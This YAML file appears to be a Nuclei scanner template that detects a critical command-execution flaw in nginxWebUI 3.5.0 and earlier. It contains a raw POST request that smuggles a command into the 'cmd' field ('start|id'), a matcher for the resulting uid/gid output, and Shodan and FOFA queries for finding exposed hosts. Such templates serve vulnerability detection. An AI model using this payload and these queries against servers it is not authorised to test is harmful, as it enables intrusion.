http:
- matchers:
  - part: body
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /adminPage/remote/cmdOver HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    remoteId=local&cmd=start|id&interval=1

    '
id: nginx-webui-rce
info:
  author: ritikchaddha
  description: 'There is a command execution vulnerability in the nginxWebUI backend.
    After logging in to the backend, the attacker can execute any command to obtain
    server permissions.

    '
  metadata:
    fofa-query: title="nginxwebui"
    max-request: 1
    shodan-query: title="nginxwebui"
  name: "nginxWebUI \u2264 3.5.0 - Remote Command Execution"
  reference:
  - https://forum.butian.net/article/243
  severity: critical
  tags: nginx,nginxwebui,webui,rce,vuln
